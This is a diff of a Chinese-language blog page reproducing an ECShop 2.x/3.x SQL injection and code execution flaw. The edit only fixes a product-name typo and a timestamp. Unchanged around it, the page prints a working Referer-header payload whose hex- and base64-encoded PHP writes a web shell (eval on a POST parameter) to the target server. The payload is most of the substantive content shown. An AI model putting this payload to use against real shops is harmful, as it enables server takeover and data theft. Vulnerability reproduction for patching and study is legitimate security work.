@@ -79,12 +79,12 @@
 
 
 
-<meta name="description" content="影响ECShop 2.x版本、ECShop 3.x版本 复现过程环境：exshop 2.7.3 + mysql 5.5 抓包增加refer字段以利用：1Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&amp;#123;s:3:&quot;num&quot;;s:280:&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b246173642">
+<meta name="description" content="影响ECShop 2.x版本、ECShop 3.x版本 复现过程环境：ECShop 2.7.3 + mysql 5.5 抓包增加refer字段以利用：1Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&amp;#123;s:3:&quot;num&quot;;s:280:&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b246173642">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ECShop 2.x 3.x SQL注入、任意代码执行漏洞复现">
 <meta property="og:url" content="https://github.com/zejunyang/zejunyang.github.io.git/2018/09/03/ECShop/index.html">
 <meta property="og:site_name" content="miyin的修行之地">
-<meta property="og:description" content="影响ECShop 2.x版本、ECShop 3.x版本 复现过程环境：exshop 2.7.3 + mysql 5.5 抓包增加refer字段以利用：1Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&amp;#123;s:3:&quot;num&quot;;s:280:&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b246173642">
+<meta property="og:description" content="影响ECShop 2.x版本、ECShop 3.x版本 复现过程环境：ECShop 2.7.3 + mysql 5.5 抓包增加refer字段以利用：1Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&amp;#123;s:3:&quot;num&quot;;s:280:&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b246173642">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://github.com/images/7.png">
 <meta property="og:image" content="https://github.com/images/8.png">
@@ -93,10 +93,10 @@
 <meta property="og:image" content="https://github.com/images/11.png">
 <meta property="og:image" content="https://github.com/images/12.png">
 <meta property="og:image" content="https://github.com/images/13.png">
-<meta property="og:updated_time" content="2018-09-03T04:52:48.380Z">
+<meta property="og:updated_time" content="2018-09-03T05:03:02.407Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ECShop 2.x 3.x SQL注入、任意代码执行漏洞复现">
-<meta name="twitter:description" content="影响ECShop 2.x版本、ECShop 3.x版本 复现过程环境：exshop 2.7.3 + mysql 5.5 抓包增加refer字段以利用：1Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&amp;#123;s:3:&quot;num&quot;;s:280:&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b246173642">
+<meta name="twitter:description" content="影响ECShop 2.x版本、ECShop 3.x版本 复现过程环境：ECShop 2.7.3 + mysql 5.5 抓包增加refer字段以利用：1Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&amp;#123;s:3:&quot;num&quot;;s:280:&quot;*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b246173642">
 <meta name="twitter:image" content="https://github.com/images/7.png">
 
 
@@ -308,7 +308,7 @@
 
       
         <p>影响ECShop 2.x版本、ECShop 3.x版本</p>
-<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>环境：exshop 2.7.3 + mysql 5.5</p>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>环境：ECShop 2.7.3 + mysql 5.5</p>
 <h3 id="抓包增加refer字段以利用："><a href="#抓包增加refer字段以利用：" class="headerlink" title="抓包增加refer字段以利用："></a>抓包增加refer字段以利用：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:<span class="string">"num"</span>;s:280:<span class="string">"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -"</span>;s:2:<span class="string">"id"</span>;s:3:<span class="string">"'/*"</span>;&#125;</span><br></pre></td></tr></table></figure>
 <p><img src="/images/7.png" alt="avatar"></p>
 <p>发包后网站报错：</p>
